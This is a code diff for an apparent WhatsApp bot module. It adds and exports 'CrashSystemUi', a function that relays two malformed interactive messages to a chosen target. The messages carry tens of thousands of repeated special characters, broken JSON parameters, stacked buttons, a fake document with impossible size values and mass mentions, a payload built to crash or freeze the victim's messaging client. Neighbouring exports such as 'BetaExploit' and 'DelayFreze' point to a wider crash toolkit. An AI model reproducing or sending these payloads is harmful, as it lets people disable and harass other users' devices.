@@ -3550,6 +3550,78 @@ await sock.relayMessage(target, {
         }
       );
     }
+//UI Func
+async function CrashSystemUi(target) {
+    const payload1 = {
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        hasMediaAttachment: false
+                    },
+                    body: {
+                        text: "⎋ stravas whyy ¿?" + "ꦾ".repeat(30000), 
+                    },
+                    footer: {
+                        text: "⎋stravas whyy ¿?" + "ꦽ".repeat(10000), 
+                    },
+                    nativeFlowMessage: {
+                        messageParamsJson: ")}".repeat(5000), 
+                        buttons: [
+                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
+                            { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) },
+                            { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦽ".repeat(5000) }) }
+                        ],
+                    }
+                }
+            }
+        }
+    };
+    const payload2 = {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
+                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
+                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                            fileLength: "9999999999999999",
+                            pageCount: 0x9184e729fff,
+                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                            fileName: "⎋ mexx whyy ¿?",
+                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
+                            mediaKeyTimestamp: "1715880173",
+                            contactVcard: true
+                        },
+                        title: "⎋ stravas whyy ¿?" ,
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                        text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
+                    }
+                }
+            }
+        }
+    };
+    try {
+        await sock.relayMessage(target, payload1, { participant: { jid: target } });
+        await sock.relayMessage(target, payload2, { participant: { jid: target } });
+    } catch (err) {
+    }
+}
 module.exports = {
   // Session management
   activeConnections,
@@ -3625,5 +3697,7 @@ BetaExploit,
   blanokmhk,
   blapoymnk,
   R9X,
+  //New Module
   DelayFreze,
+  CrashSystemUi,
 };
